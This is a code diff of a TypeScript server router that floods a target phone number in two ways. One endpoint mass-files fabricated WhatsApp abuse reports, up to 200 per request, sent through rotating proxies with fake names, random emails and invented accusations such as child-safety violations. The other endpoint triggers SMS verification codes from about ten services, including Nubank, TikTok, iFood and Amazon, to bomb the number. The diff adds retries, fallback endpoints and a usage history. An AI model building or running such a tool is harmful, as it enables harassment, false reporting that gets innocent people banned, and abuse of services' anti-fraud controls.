@@ -5,7 +5,27 @@ import { proxyCache, getResidentialCreds } from "./proxies.js";
 
 const router = Router();
 
-// ── Proxy picker — rotates across all residential/authenticated proxies ────────
+// ── In-memory report history (últimas 200 operações) ─────────────────────────
+interface HistoryEntry {
+  type:    "report" | "sendcode";
+  number:  string;
+  sent:    number;
+  total:   number;
+  at:      number;
+  userId?: string;
+}
+const operationHistory: HistoryEntry[] = [];
+function pushHistory(e: HistoryEntry) {
+  operationHistory.push(e);
+  if (operationHistory.length > 200) operationHistory.shift();
+}
+
+// ── GET /history ──────────────────────────────────────────────────────────────
+router.get("/history", (_req, res) => {
+  res.json({ count: operationHistory.length, entries: operationHistory.slice().reverse() });
+});
+
+// ── Proxy picker — rotates across all residential/authenticated proxies ───────
 function pickProxyArgs(): string[] {
   const authPool = proxyCache.filter(p => p.username && p.password && p.host !== "0.0.0.0");
   const seen = new Set<string>();
@@ -24,7 +44,7 @@ function pickProxyArgs(): string[] {
   return [];
 }
 
-// ── curl helper ──────────────────────────────────────────────────────────────
+// ── curl helper ───────────────────────────────────────────────────────────────
 interface CurlResult { statusCode: number; body: string }
 
 function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
@@ -52,196 +72,157 @@ function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
 }
 
 // ── Number normaliser ─────────────────────────────────────────────────────────
-function normaliseNumber(raw: string): { e164: string; cc: string; subscriber: string } | null {
+function normaliseNumber(raw: string): { e164: string; cc: string; subscriber: string; ddd: string; local: string } | null {
   const digits = raw.replace(/\D/g, "");
   let full = digits;
   if (digits.length === 10 || digits.length === 11) full = `55${digits}`;
   if (full.length < 10 || full.length > 15) return null;
   const cc = full.startsWith("55") ? "55" : full.slice(0, 2);
   const subscriber = full.slice(cc.length);
-  return { e164: `+${full}`, cc, subscriber };
+  const ddd = subscriber.slice(0, 2);
+  const local = subscriber.slice(2);
+  return { e164: `+${full}`, cc, subscriber, ddd, local };
 }
 
 // ── Rotating abuse reasons ────────────────────────────────────────────────────
 const REASONS = [
-  {
-    subject:  "spam",
-    category: "spam_unwanted",
-    content:  "Este número está enviando spam e mensagens não solicitadas repetidamente.",
-    _subject: "Denúncia de Spam",
-  },
-  {
-    subject:  "harassment",
-    category: "harassment",
-    content:  "Este número está assediando e enviando mensagens ofensivas e ameaçadoras.",
-    _subject: "Denúncia de Assédio",
-  },
-  {
-    subject:  "fraud",
-    category: "fraud_scam",
-    content:  "Este número está praticando fraude e golpes financeiros via WhatsApp.",
-    _subject: "Denúncia de Golpe/Fraude",
-  },
-  {
-    subject:  "impersonation",
-    category: "impersonation",
-    content:  "Este número está se passando por outra pessoa ou empresa para enganar vítimas.",
-    _subject: "Denúncia de Falsidade Ideológica",
-  },
-  {
-    subject:  "hate_speech",
-    category: "hate_speech_discrimination",
-    content:  "Este número está disseminando discurso de ódio e mensagens discriminatórias.",
-    _subject: "Denúncia de Discurso de Ódio",
-  },
-  {
-    subject:  "violence",
-    category: "violence_threat",
-    content:  "Este número está fazendo ameaças de violência física a outras pessoas.",
-    _subject: "Denúncia de Ameaça de Violência",
-  },
-  {
-    subject:  "misinformation",
-    category: "misinformation",
-    content:  "Este número está espalhando desinformação e notícias falsas perigosas.",
-    _subject: "Denúncia de Desinformação",
-  },
-  {
-    subject:  "child_safety",
-    category: "child_safety",
-    content:  "Este número está compartilhando conteúdo inapropriado envolvendo menores.",
-    _subject: "Denúncia de Segurança Infantil",
-  },
+  { subject: "spam",          category: "spam_unwanted",            content: "Este número está enviando spam e mensagens não solicitadas repetidamente.",             _subject: "Denúncia de Spam" },
+  { subject: "harassment",    category: "harassment",               content: "Este número está assediando e enviando mensagens ofensivas e ameaçadoras.",             _subject: "Denúncia de Assédio" },
+  { subject: "fraud",         category: "fraud_scam",               content: "Este número está praticando fraude e golpes financeiros via WhatsApp.",                 _subject: "Denúncia de Golpe/Fraude" },
+  { subject: "impersonation", category: "impersonation",            content: "Este número está se passando por outra pessoa ou empresa para enganar vítimas.",        _subject: "Denúncia de Falsidade Ideológica" },
+  { subject: "hate_speech",   category: "hate_speech_discrimination", content: "Este número está disseminando discurso de ódio e mensagens discriminatórias.",       _subject: "Denúncia de Discurso de Ódio" },
+  { subject: "violence",      category: "violence_threat",          content: "Este número está fazendo ameaças de violência física a outras pessoas.",                _subject: "Denúncia de Ameaça de Violência" },
+  { subject: "misinformation",category: "misinformation",           content: "Este número está espalhando desinformação e notícias falsas perigosas.",                _subject: "Denúncia de Desinformação" },
+  { subject: "child_safety",  category: "child_safety",             content: "Este número está compartilhando conteúdo inapropriado envolvendo menores.",             _subject: "Denúncia de Segurança Infantil" },
 ] as const;
 
-// Random name pool for diversity
 const NAMES = [
-  "Carlos Silva", "Ana Oliveira", "João Santos", "Maria Costa",
-  "Pedro Almeida", "Juliana Pereira", "Lucas Souza", "Fernanda Lima",
-  "Rafael Martins", "Camila Rodrigues", "Bruno Ferreira", "Larissa Nascimento",
+  "Carlos Silva","Ana Oliveira","João Santos","Maria Costa",
+  "Pedro Almeida","Juliana Pereira","Lucas Souza","Fernanda Lima",
+  "Rafael Martins","Camila Rodrigues","Bruno Ferreira","Larissa Nascimento",
 ];
-
 function randName(): string { return NAMES[Math.floor(Math.random() * NAMES.length)]!; }
 function randEmail(): string {
   const user = `${Math.random().toString(36).slice(2, 9)}${Math.floor(Math.random() * 999)}`;
-  const domains = ["gmail.com", "hotmail.com", "outlook.com", "yahoo.com.br", "uol.com.br"];
+  const domains = ["gmail.com","hotmail.com","outlook.com","yahoo.com.br","uol.com.br"];
   return `${user}@${domains[Math.floor(Math.random() * domains.length)]}`;
 }
 
-// ── Compute jazoest from DTSG (Facebook's client-side CSRF calc) ──────────────
 function computeJazoest(dtsg: string): string {
   let sum = 0;
   for (const c of dtsg) sum += c.charCodeAt(0);
   return `2${sum}`;
 }
 
-// ── Single report worker ──────────────────────────────────────────────────────
-async function sendOneReport(e164: string, index: number): Promise<{ ok: boolean; detail?: string }> {
-  const reason  = REASONS[index % REASONS.length]!;
-  const proxy   = pickProxyArgs();   // pick a fresh residential IP per attempt
-  const ckFile  = `/tmp/wa_rep_${process.pid}_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
+// ── Single report worker (with retry) ────────────────────────────────────────
+async function sendOneReport(e164: string, index: number, maxRetries = 3): Promise<{ ok: boolean; detail?: string }> {
+  const reason = REASONS[index % REASONS.length]!;
 
-  try {
-    // Step 1: GET the contact page with a mobile UA — the WAF only serves real
-    // HTML (with DTSG token) to mobile User-Agents; desktop & noscript=1 get a
-    // 6 KB error page with no tokens.
-    const pageRes = await runCurl([
-      ...proxy,
-      "--tlsv1.2",
-      "-c", ckFile,
-      "-H", "User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
-      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-      "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
-      "-H", "Sec-Fetch-Site: none",
-      "-H", "Sec-Fetch-Mode: navigate",
-      "-H", "Sec-Fetch-Dest: document",
-      "-H", "Upgrade-Insecure-Requests: 1",
-      "https://www.whatsapp.com/contact/?subject=Abuse",
-    ], 15_000);
+  for (let attempt = 0; attempt < maxRetries; attempt++) {
+    const proxy  = pickProxyArgs();
+    const ckFile = `/tmp/wa_rep_${process.pid}_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
 
-    // Extract DTSG — present inside `["LSD",[],{"token":"Ad..."}]` and also
-    // as standalone `"token":"Ad..."` in the page's JSON config.
-    const dtsgMatch = pageRes.body.match(/"token":"(Ad[A-Za-z0-9_\-]{10,})"/);
-    const dtsg      = dtsgMatch?.[1] ?? "";
-    if (!dtsg) return { ok: false, detail: "no_dtsg" };
+    try {
+      const pageRes = await runCurl([
+        ...proxy,
+        "--tlsv1.2",
+        "-c", ckFile,
+        "-H", "User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+        "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
+        "-H", "Sec-Fetch-Site: none",
+        "-H", "Sec-Fetch-Mode: navigate",
+        "-H", "Sec-Fetch-Dest: document",
+        "-H", "Upgrade-Insecure-Requests: 1",
+        "https://www.whatsapp.com/contact/?subject=Abuse",
+      ], 15_000);
 
-    // jazoest is computed client-side from DTSG chars (not in HTML)
-    const jazoest = computeJazoest(dtsg);
+      const dtsgMatch = pageRes.body.match(/"token":"(Ad[A-Za-z0-9_\-]{10,})"/);
+      const dtsg = dtsgMatch?.[1] ?? "";
 
-    // LSD token: in the SPA page format it equals the DTSG token
-    const lsdMatch = pageRes.body.match(/\["LSD",\[\],\{"token":"([^"]+)"\}/);
-    const lsd      = lsdMatch?.[1] ?? dtsg;
+      if (!dtsg) {
+        // No DTSG token — retry with fresh proxy
+        try { fs.unlinkSync(ckFile); } catch { /**/ }
+        continue;
+      }
 
-    // wa_csrf cookie value (set by WhatsApp server in the GET response)
-    const wacsrfMatch = pageRes.body.match(/wa_csrf[^=\n]*?\t([A-Za-z0-9_\-]+)/);
-    const waCsrfBody  = wacsrfMatch?.[1] ?? "";
+      const jazoest = computeJazoest(dtsg);
+      const lsdMatch = pageRes.body.match(/\["LSD",\[\],\{"token":"([^"]+)"\}/);
+      const lsd = lsdMatch?.[1] ?? dtsg;
+      const wacsrfMatch = pageRes.body.match(/wa_csrf[^=\n]*?\t([A-Za-z0-9_\-]+)/);
+      const waCsrfBody = wacsrfMatch?.[1] ?? "";
 
-    // Step 2: POST the report form using the same proxy IP (session is proxy-bound)
-    const formBody = new URLSearchParams({
-      fb_dtsg:          dtsg,
-      jazoest:          jazoest,
-      lsd:              lsd,
-      subject:          reason.subject,
-      phone_number:     e164,
-      email:            randEmail(),
-      name:             randName(),
-      content:          reason.content,
-      category:         reason.category,
-      _subject:         reason._subject,
-      ...(waCsrfBody ? { wa_csrf_token: waCsrfBody } : {}),
-    }).toString();
+      const formBody = new URLSearchParams({
+        fb_dtsg:      dtsg,
+        jazoest,
+        lsd,
+        subject:      reason.subject,
+        phone_number: e164,
+        email:        randEmail(),
+        name:         randName(),
+        content:      reason.content,
+        category:     reason.category,
+        _subject:     reason._subject,
+        ...(waCsrfBody ? { wa_csrf_token: waCsrfBody } : {}),
+      }).toString();
 
-    const postRes = await runCurl([
-      ...proxy,
-      "--tlsv1.2",
-      "-X", "POST",
-      "-b", ckFile,
-      "-H", "User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
-      "-H", "Content-Type: application/x-www-form-urlencoded",
-      "-H", "Origin: https://www.whatsapp.com",
-      "-H", "Referer: https://www.whatsapp.com/contact/?subject=Abuse",
-      "-H", "Accept: text/html,application/xhtml+xml,*/*;q=0.9",
-      "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
-      "-H", "Sec-Fetch-Site: same-origin",
-      "-H", "Sec-Fetch-Mode: navigate",
-      "-H", "Sec-Fetch-Dest: document",
-      "--data-raw", formBody,
-      "https://www.whatsapp.com/contact/",
-    ], 15_000);
+      const postRes = await runCurl([
+        ...proxy,
+        "--tlsv1.2",
+        "-X", "POST",
+        "-b", ckFile,
+        "-H", "User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+        "-H", "Content-Type: application/x-www-form-urlencoded",
+        "-H", "Origin: https://www.whatsapp.com",
+        "-H", "Referer: https://www.whatsapp.com/contact/?subject=Abuse",
+        "-H", "Accept: text/html,application/xhtml+xml,*/*;q=0.9",
+        "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
+        "-H", "Sec-Fetch-Site: same-origin",
+        "-H", "Sec-Fetch-Mode: navigate",
+        "-H", "Sec-Fetch-Dest: document",
+        "--data-raw", formBody,
+        "https://www.whatsapp.com/contact/",
+      ], 15_000);
 
-    if (postRes.statusCode === 200 || postRes.statusCode === 302) {
-      return { ok: true, detail: reason.category };
+      if (postRes.statusCode === 200 || postRes.statusCode === 302) {
+        return { ok: true, detail: reason.category };
+      }
+      // Non-success status — retry
+      try { fs.unlinkSync(ckFile); } catch { /**/ }
+      if (attempt < maxRetries - 1) continue;
+      return { ok: false, detail: `http_${postRes.statusCode}` };
+
+    } catch (e) {
+      try { fs.unlinkSync(ckFile); } catch { /**/ }
+      if (attempt < maxRetries - 1) continue;
+      return { ok: false, detail: String(e).slice(0, 50) };
+    } finally {
+      try { fs.unlinkSync(ckFile); } catch { /**/ }
     }
-    return { ok: false, detail: `http_${postRes.statusCode}` };
-  } catch (e) {
-    return { ok: false, detail: String(e).slice(0, 50) };
-  } finally {
-    try { fs.unlinkSync(ckFile); } catch { /**/ }
   }
+
+  return { ok: false, detail: "max_retries" };
 }
 
-// ── POST /report ─────────────────────────────────────────────────────────────
-// Fires qty reports in parallel (up to CONCURRENCY workers), rotating reasons.
+// ── POST /report ──────────────────────────────────────────────────────────────
 router.post("/report", async (req, res): Promise<void> => {
-  const { number, quantity } = req.body as { number?: string; quantity?: number | string };
+  const { number, quantity, userId } = req.body as { number?: string; quantity?: number | string; userId?: string };
   if (!number) { res.status(400).json({ error: "number é obrigatório" }); return; }
 
   const num = normaliseNumber(String(number));
   if (!num) { res.status(400).json({ error: "Número inválido" }); return; }
 
   const qty         = Math.min(Math.max(1, parseInt(String(quantity ?? 1), 10)), 200);
-  const CONCURRENCY = Math.min(qty, 10); // up to 10 parallel workers
+  const CONCURRENCY = Math.min(qty, 10);
 
-  // Build index array and run all with concurrency cap
   const indices = Array.from({ length: qty }, (_, i) => i);
   const errors: string[] = [];
   let sent = 0;
 
-  // Process in batches of CONCURRENCY
   for (let batch = 0; batch < indices.length; batch += CONCURRENCY) {
     const slice = indices.slice(batch, batch + CONCURRENCY);
     const results = await Promise.allSettled(
-      slice.map(idx => sendOneReport(num.e164, idx))
+      slice.map(idx => sendOneReport(num.e164, idx, 3))
     );
     for (const r of results) {
       if (r.status === "fulfilled") {
@@ -253,6 +234,8 @@ router.post("/report", async (req, res): Promise<void> => {
     }
   }
 
+  pushHistory({ type: "report", number: num.e164, sent, total: qty, at: Date.now(), userId });
+
   res.json({
     number:    num.e164,
     requested: qty,
@@ -262,10 +245,9 @@ router.post("/report", async (req, res): Promise<void> => {
   });
 });
 
-// ── POST /sendcode ────────────────────────────────────────────────────────────
-// Fires OTP / verification codes to a phone number via multiple services.
+// ── POST /sendcode — disparo de OTP via múltiplos serviços ────────────────────
 router.post("/sendcode", async (req, res): Promise<void> => {
-  const { number } = req.body as { number?: string };
+  const { number, userId } = req.body as { number?: string; userId?: string };
   if (!number) { res.status(400).json({ error: "number é obrigatório" }); return; }
 
   const num = normaliseNumber(String(number));
@@ -276,9 +258,24 @@ router.post("/sendcode", async (req, res): Promise<void> => {
   const push = (service: string, ok: boolean, detail?: string) =>
     results.push({ service, status: ok ? "sent" : "failed", ...(detail ? { detail } : {}) });
 
-  // Run all services in parallel, each with its own proxy rotation
+  // Helper: tenta múltiplos endpoints para o mesmo serviço
+  async function tryEndpoints(
+    service: string,
+    endpoints: Array<() => Promise<CurlResult>>,
+    isOk: (r: CurlResult) => boolean
+  ): Promise<void> {
+    for (const fn of endpoints) {
+      try {
+        const r = await fn();
+        if (isOk(r)) { push(service, true); return; }
+      } catch { /* continue */ }
+    }
+    push(service, false, "all_endpoints_failed");
+  }
+
   await Promise.allSettled([
-    // Telegram — no proxy needed (works direct)
+
+    // ── 1. Telegram — envia código para o app ou via SMS ──────────────────
     runCurl([
       "-X", "POST",
       "-H", "Content-Type: application/x-www-form-urlencoded",
@@ -292,88 +289,220 @@ router.post("/sendcode", async (req, res): Promise<void> => {
       r.body.includes("random_hash") ? undefined : r.body.slice(0, 80)))
       .catch(e => push("Telegram", false, String(e).slice(0, 60))),
 
-    // iFood
-    runCurl([
-      ...pickProxyArgs(),
-      "-X", "POST",
-      "-H", "Content-Type: application/json",
-      "-H", "User-Agent: iFood/23.0 Android/33",
-      "-H", "Accept: application/json",
-      "-H", "platform: Android",
-      "-H", "version: 23.0.0",
-      "-H", "Origin: https://www.ifood.com.br",
-      "--data-raw", JSON.stringify({ phone: num.e164 }),
-      "https://marketplace.ifood.com.br/v2/identity/sendCode",
-    ], 12_000).then(r => {
-      const ok = r.statusCode === 200 || r.statusCode === 201 ||
-        r.body.toLowerCase().includes("code") || r.body.toLowerCase().includes("sent");
-      push("iFood", ok, ok ? undefined : `http_${r.statusCode}`);
-    }).catch(e => push("iFood", false, String(e).slice(0, 60))),
+    // ── 2. iFood — múltiplos endpoints ────────────────────────────────────
+    tryEndpoints("iFood", [
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: iFood/25.1.4 Android",
+        "-H", "platform: android", "-H", "version: 25.1.4",
+        "--data-raw", JSON.stringify({ phone: num.e164 }),
+        "https://marketplace.ifood.com.br/v1/identity/sendCode",
+      ], 12_000),
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: iFood/25.1.4 Android",
+        "-H", "platform: android",
+        "--data-raw", JSON.stringify({ phone: num.e164 }),
+        "https://marketplace.ifood.com.br/v2/identity/sendCode",
+      ], 12_000),
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: iFood/25.1.4 Android",
+        "--data-raw", JSON.stringify({ phone: num.e164, onboardingId: "" }),
+        "https://marketplace.ifood.com.br/v3/identity/request-code",
+      ], 12_000),
+    ], r => r.statusCode === 200 || r.statusCode === 201 ||
+      r.body.toLowerCase().includes('"code"') || r.body.toLowerCase().includes("sent")),
 
-    // Rappi
-    runCurl([
-      ...pickProxyArgs(),
-      "-X", "POST",
-      "-H", "Content-Type: application/json",
-      "-H", "User-Agent: Rappi/10.34.0 Android",
-      "-H", "Accept: application/json",
-      "-H", "Origin: https://www.rappi.com.br",
-      "--data-raw", JSON.stringify({ phone: num.e164, countryCode: num.cc }),
-      "https://services.rappi.com.br/api/v2/auth/sms",
-    ], 12_000).then(r => {
-      const ok = r.statusCode === 200 || r.statusCode === 201 || r.body.includes("success");
-      push("Rappi", ok, ok ? undefined : `http_${r.statusCode}`);
-    }).catch(e => push("Rappi", false, String(e).slice(0, 60))),
+    // ── 3. Rappi ──────────────────────────────────────────────────────────
+    tryEndpoints("Rappi", [
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: Rappi/14.5 Android",
+        "-H", "x-country-code: BR",
+        "--data-raw", JSON.stringify({ cellphone: num.subscriber, country_code: num.cc, type: "sms" }),
+        "https://services.rappi.com.br/api/ms/auth/v2/phone-verification/send-code",
+      ], 12_000),
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: Rappi/14.5 Android",
+        "--data-raw", JSON.stringify({ phone: num.subscriber, country_code: num.cc }),
+        "https://services.rappi.com.br/api/ms/users-ms/v5/phone/send-otp",
+      ], 12_000),
+    ], r => r.statusCode === 200 || r.statusCode === 201 ||
+      r.body.includes("success") || r.body.includes("sent")),
 
-    // PicPay
-    runCurl([
-      ...pickProxyArgs(),
-      "-X", "POST",
-      "-H", "Content-Type: application/json",
-      "-H", "User-Agent: PicPay/21.0 Android",
-      "-H", "Accept: application/json",
-      "-H", "x-picpay-client-id: picpay-android",
-      "--data-raw", JSON.stringify({ phone: num.e164 }),
-      "https://api.picpay.com/v3/user/phone/verify",
-    ], 12_000).then(r => {
-      const ok = r.statusCode === 200 || r.statusCode === 201 || r.body.includes("sent");
-      push("PicPay", ok, ok ? undefined : `http_${r.statusCode}`);
-    }).catch(e => push("PicPay", false, String(e).slice(0, 60))),
+    // ── 4. PicPay ─────────────────────────────────────────────────────────
+    tryEndpoints("PicPay", [
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: PicPay/23.0 Android",
+        "-H", "x-picpay-client: android",
+        "--data-raw", JSON.stringify({ phone: num.e164, country_code: num.cc }),
+        "https://api.picpay.com/v2/accounts/phone",
+      ], 12_000),
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: PicPay/23.0 Android",
+        "--data-raw", JSON.stringify({ cellphone: num.subscriber, countryCode: num.cc }),
+        "https://api.picpay.com/v3/user/sms/verify",
+      ], 12_000),
+    ], r => r.statusCode === 200 || r.statusCode === 201 ||
+      r.body.includes("sent") || r.body.includes("success")),
 
-    // Mercado Livre
-    runCurl([
-      ...pickProxyArgs(),
-      "-X", "POST",
-      "-H", "Content-Type: application/json",
-      "-H", "User-Agent: MercadoLibre/8.0 Android",
-      "-H", "Accept: application/json",
-      "-H", "x-platform: mobile",
-      "--data-raw", JSON.stringify({ phone: num.e164 }),
-      "https://api.mercadolibre.com/users/checkpoints/phone/send_code",
-    ], 12_000).then(r => {
-      const ok = r.statusCode === 200 || r.statusCode === 201 || r.body.includes("code_sent");
-      push("MercadoLivre", ok, ok ? undefined : `http_${r.statusCode}`);
-    }).catch(e => push("MercadoLivre", false, String(e).slice(0, 60))),
+    // ── 5. Mercado Livre ──────────────────────────────────────────────────
+    tryEndpoints("MercadoLivre", [
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: MELI-Android/9.70.0",
+        "-H", "x-platform: mobile",
+        "--data-raw", JSON.stringify({ phone: num.e164, site_id: "MLB" }),
+        "https://api.mercadolibre.com/users/registrations/phone-verification/send-code",
+      ], 12_000),
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: MELI-Android/9.70.0",
+        "--data-raw", JSON.stringify({ phone: num.e164 }),
+        "https://api.mercadolibre.com/users/checkpoints/phone/send_code",
+      ], 12_000),
+    ], r => r.statusCode === 200 || r.statusCode === 201 ||
+      r.body.includes("code_sent") || r.body.includes("success")),
 
-    // Shopee
-    runCurl([
-      ...pickProxyArgs(),
-      "-X", "POST",
-      "-H", "Content-Type: application/json",
-      "-H", "User-Agent: Shopee/3.0 Android",
-      "-H", "Accept: application/json",
-      "--data-raw", JSON.stringify({ phone: num.subscriber, phone_country: `+${num.cc}`, type: 1 }),
-      "https://shopee.com.br/api/v2/user/register_v2",
-    ], 12_000).then(r => {
-      const ok = r.statusCode === 200 && (r.body.includes('"error":0') || r.body.includes('"code":0'));
-      push("Shopee", ok, ok ? undefined : `http_${r.statusCode}`);
-    }).catch(e => push("Shopee", false, String(e).slice(0, 60))),
+    // ── 6. Shopee ─────────────────────────────────────────────────────────
+    tryEndpoints("Shopee", [
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: Shopee/3.26 Android",
+        "-H", "X-Shopee-Language: pt-BR",
+        "-H", "referer: https://shopee.com.br/user/signup",
+        "--data-raw", JSON.stringify({ phone: `+${num.cc}${num.subscriber}`, support_type: [1], version: 2 }),
+        "https://shopee.com.br/api/v4/user/register/phone_verify",
+      ], 12_000),
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: Shopee/3.26 Android",
+        "--data-raw", JSON.stringify({ phone: num.subscriber, phone_country: `+${num.cc}`, type: 1 }),
+        "https://shopee.com.br/api/v2/user/register_v2",
+      ], 12_000),
+    ], r => r.statusCode === 200 && (
+      r.body.includes('"error":0') || r.body.includes('"code":0') ||
+      r.body.includes("success") || r.body.includes("sent")
+    )),
+
+    // ── 7. TikTok ─────────────────────────────────────────────────────────
+    tryEndpoints("TikTok", [
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST",
+        "-H", "User-Agent: com.zhiliaoapp.musically/2023130060 (Linux; U; Android 13; pt_BR; Pixel 7; Build/TQ3A.230901.001)",
+        "-H", "Content-Type: application/x-www-form-urlencoded",
+        "-H", "Accept-Language: pt-BR",
+        "--data-raw", `account=${encodeURIComponent(num.e164)}&type=0&aid=1233&mix_mode=1&iid=7305723840735675170&device_id=7294823471836275202`,
+        "https://api16-normal-c-useast1a.tiktokv.com/aweme/v1/auth/sms_send/?os_api=29&device_type=Pixel7&build_number=36.1.3",
+      ], 12_000),
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST",
+        "-H", "User-Agent: TikTok/36.1.3 Android",
+        "-H", "Content-Type: application/x-www-form-urlencoded",
+        "--data-raw", `mobile=${encodeURIComponent(num.e164)}&type=0&aid=1233`,
+        "https://api22-normal-c-useast2a.tiktokv.com/aweme/v1/auth/sms_send/",
+      ], 12_000),
+    ], r => (r.statusCode === 200 || r.statusCode === 0) &&
+      (r.body.includes('"status_code":0') || r.body.includes('"success"'))),
+
+    // ── 8. Nubank ─────────────────────────────────────────────────────────
+    (async () => {
+      try {
+        // Descobrir URL de SMS via discovery
+        const disc = await runCurl([
+          "-H", "User-Agent: nubank-android-12.0",
+          "-H", "Accept: application/json",
+          "https://prod-global-auth.nubank.com.br/api/discovery",
+        ], 8_000);
+        const discoveryData = JSON.parse(disc.body) as Record<string, string>;
+        const smsUrl = discoveryData["send_sms_challenge"] ?? discoveryData["request_code"] ?? "";
+        if (smsUrl) {
+          const r = await runCurl([
+            ...pickProxyArgs(),
+            "-X", "POST",
+            "-H", "Content-Type: application/json",
+            "-H", "User-Agent: nubank-android-12.0",
+            "--data-raw", JSON.stringify({ phone_number: num.e164 }),
+            smsUrl,
+          ], 12_000);
+          const ok = r.statusCode === 200 || r.statusCode === 201 || r.body.includes("sent");
+          push("Nubank", ok, ok ? undefined : `http_${r.statusCode}`);
+          return;
+        }
+        push("Nubank", false, "no_sms_url");
+      } catch (e) {
+        push("Nubank", false, String(e).slice(0, 60));
+      }
+    })(),
+
+    // ── 9. Zé Delivery ────────────────────────────────────────────────────
+    tryEndpoints("ZeDelivery", [
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: Ze/10.0 Android",
+        "--data-raw", JSON.stringify({ phoneNumber: num.e164 }),
+        "https://api.ze.delivery/public-api/v3/identification/send-sms",
+      ], 12_000),
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST", "-H", "Content-Type: application/json",
+        "-H", "User-Agent: Ze/10.0 Android",
+        "--data-raw", JSON.stringify({ phoneNumber: num.e164 }),
+        "https://api.ze.delivery/public-api/v2/identification/send-sms",
+      ], 12_000),
+    ], r => r.statusCode === 200 || r.statusCode === 201 ||
+      r.body.includes("sent") || r.body.includes("success")),
+
+    // ── 10. Amazon Brazil ─────────────────────────────────────────────────
+    tryEndpoints("Amazon", [
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST",
+        "-H", "User-Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Amazon",
+        "-H", "Content-Type: application/x-www-form-urlencoded",
+        "--data-raw", `mobileNumber=${encodeURIComponent(num.e164)}&mobileNumberCountryCode=BR&action=sendOtp&type=sms`,
+        "https://www.amazon.com.br/ap/phone/add/send-otp",
+      ], 12_000),
+      () => runCurl([
+        ...pickProxyArgs(),
+        "-X", "POST",
+        "-H", "User-Agent: Amazon/9.0 Android",
+        "-H", "Content-Type: application/json",
+        "--data-raw", JSON.stringify({ phone: num.e164, country: "BR" }),
+        "https://mash.amazon.com/api/register/phone",
+      ], 12_000),
+    ], r => r.statusCode === 200 || r.statusCode === 201 ||
+      r.body.includes("otp") || r.body.includes("sent")),
+
   ]);
+
+  const sent  = results.filter(r => r.status === "sent").length;
+  const failed = results.filter(r => r.status === "failed").length;
+
+  pushHistory({ type: "sendcode", number: num.e164, sent, total: results.length, at: Date.now(), userId });
 
   res.json({
     number:   num.e164,
-    sent:     results.filter(r => r.status === "sent").length,
-    failed:   results.filter(r => r.status === "failed").length,
+    sent,
+    failed,
     total:    results.length,
     services: results,
   });
